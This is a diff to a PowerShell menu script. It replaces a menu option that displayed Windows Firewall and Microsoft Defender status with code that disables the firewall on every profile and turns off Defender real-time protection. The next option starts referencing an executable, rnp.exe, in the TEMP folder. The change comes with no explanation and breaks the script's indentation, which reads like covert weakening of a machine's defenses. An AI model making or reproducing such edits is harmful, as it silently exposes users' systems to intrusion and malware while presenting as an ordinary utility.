@@ -66,22 +66,20 @@ function Show-Menu {
             switch ($choice) {
 
                 '1' {
-                    Write-Host "`nWindows Firewall Status:" `
-                        -ForegroundColor Cyan
+    Write-Host "`nDisabling Windows Firewall..." -ForegroundColor Yellow
 
-                    Get-NetFirewallProfile |
-                        Select-Object Name, Enabled |
-                        Format-Table -AutoSize
+    Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False
 
-                    Write-Host "`nMicrosoft Defender Status:" `
-                        -ForegroundColor Cyan
+    Write-Host "Firewall disabled." -ForegroundColor Green
 
-                    Get-MpComputerStatus |
-                        Select-Object RealTimeProtectionEnabled |
-                        Format-Table -AutoSize
+    Write-Host "`nDisabling Microsoft Defender real-time protection..." -ForegroundColor Yellow
 
-                    Pause-Menu
-                }
+    Set-MpPreference -DisableRealtimeMonitoring $true
+
+    Write-Host "Defender real-time protection disabled." -ForegroundColor Green
+
+    Pause-Menu
+}
 
                 '2' {
                    $file = "$env:TEMP\rnp.exe"
